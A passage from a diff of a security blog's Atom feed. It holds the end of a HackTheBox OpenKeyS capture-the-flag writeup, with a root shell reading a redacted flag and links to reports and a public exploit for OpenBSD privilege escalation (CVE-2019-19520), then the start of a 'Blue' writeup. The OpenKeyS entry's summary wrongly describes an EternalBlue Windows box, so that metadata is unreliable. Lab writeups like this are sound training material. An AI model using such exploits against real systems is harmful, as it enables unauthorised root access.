+openkeys# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt                                                                                                                                                                                 
+f3a55---REDEACTED---c6efa
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/OpenKeyS/rootshell.png&quot; alt=&quot;Root Shell&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;system-owned&quot;&gt;System Owned&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/OpenKeyS/sysown.png&quot; alt=&quot;System Owned&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;resources&quot;&gt;Resources&lt;/h1&gt;
+&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:fn1&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/b4bygroot/TargetRecon&quot;&gt;targetRecon&lt;/a&gt; &lt;a href=&quot;#fnref:fn1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn2&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt&quot;&gt;Authentication vulnerabilities in OpenBSD&lt;/a&gt; &lt;a href=&quot;#fnref:fn2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn3&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://nakedsecurity.sophos.com/2019/12/06/openbsd-devs-patch-authentication-bypass-bug/&quot;&gt;OpenBSD devs patch authentication bypass bug&lt;/a&gt; &lt;a href=&quot;#fnref:fn3&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn4&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/cve/CVE-2019-19520&quot;&gt;CVE-2019-19520&lt;/a&gt; &lt;a href=&quot;#fnref:fn4&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:fn5&quot; role=&quot;doc-endnote&quot;&gt;
+      &lt;p&gt;&lt;a href=&quot;https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520&quot;&gt;bcoles/local-exploits/CVE-2019-19520&lt;/a&gt; &lt;a href=&quot;#fnref:fn5&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;</content><author><name>b4bygroot</name></author><category term="HTB" /><category term="Writeup" /><category term="Machine" /><category term="Linux" /><category term="OpenBSD" /><category term="Authentication Vulnerability" /><category term="without metasploit" /><category term="Local Privilege Escalation" /><category term="CVE-2019-19520" /><summary type="html">A retired windows box from HackTheBox, vulnerable to EternalBlue (MS17-010), exploited manually and gained SYSTEM access.</summary></entry><entry><title type="html">Blue Machine Writeup- HackTheBox</title><link href="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/" rel="alternate" type="text/html" title="Blue Machine Writeup- HackTheBox" /><published>2020-12-09T16:00:00+05:30</published><updated>2020-12-09T16:00:00+05:30</updated><id>http://localhost:4000/2020/12/09/HTB_Blue_Writeup</id><content type="html" xml:base="http://localhost:4000/2020/12/09/HTB_Blue_Writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/Blue/info.png&quot; alt=&quot;Info&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;methodology&quot;&gt;Methodology&lt;/h1&gt;
 &lt;ol&gt;
